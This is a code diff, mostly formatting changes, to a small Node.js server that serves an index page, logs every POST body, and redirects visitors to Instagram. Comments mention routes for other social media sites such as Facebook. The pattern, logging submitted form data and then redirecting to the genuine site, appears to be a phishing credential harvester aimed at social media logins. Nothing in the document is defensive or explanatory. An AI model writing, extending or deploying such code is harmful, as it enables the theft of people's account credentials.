@@ -9,15 +9,14 @@ const server = http.createServer(async (req, res) => {
     if (req.url == "/" || req.url == "") {
         url = "index.html";
     }
-    switch(req.method){
+    switch (req.method) {
         case "GET":
-            GET(url, req, res)
+            GET(url, req, res);
             break;
         case "POST":
-            POST(url, req, res)
+            POST(url, req, res);
             break;
     }
-
 });
 
 async function GET(url, req, res) {
@@ -42,15 +41,13 @@ async function POST(url, req, res) {
         console.log(body);
 
         res.statusCode = 302;
-        res.setHeader('Location', 'https://www.instagram.com')
+        res.setHeader("Location", "https://www.instagram.com");
 
         res.end();
     });
-    
 }
 
 server.listen(8191);
-
 
 //3 social media.
 //facebook ex '/facebook'
